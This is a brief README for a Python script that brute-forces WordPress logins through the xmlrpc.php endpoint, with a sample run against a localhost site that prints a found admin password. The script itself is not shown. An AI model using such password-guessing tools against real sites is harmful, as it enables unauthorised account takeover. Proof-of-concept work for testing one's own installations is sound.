#WordPress XMLRPC Bruteforcer

Very heavily inspired by https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit.git

This is a very simple rewrite that works with a single attemp per request. This because I could not get the original to work reliably and I needed a quick version as a POC.

``` 
# ./wpxmlb.py https://localhost/wordpress/xmlrpc.php ./password_list admin
....
Password found for admin user: 
	 - username: admin
	 - password: 12345
# _
```

Any comments are welcome.
